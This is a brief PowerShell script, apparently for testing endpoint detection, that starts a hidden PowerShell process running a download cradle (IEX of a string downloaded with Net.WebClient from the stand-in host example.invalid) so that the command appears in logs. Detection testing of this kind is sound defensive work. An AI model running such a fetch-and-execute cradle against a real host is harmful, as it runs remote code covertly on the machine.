# Run in an elevated PowerShell on Windows endpoint
# This will create a suspicious PowerShell command line entry in logs
Start-Process -FilePath "powershell" -ArgumentList "-NoP -W Hidden -C `"IEX ((New-Object Net.WebClient).DownloadString('http://example.invalid/p'))`"" -WindowStyle Hidden
Write-Output "Executed suspicious PowerShell download cradle command"
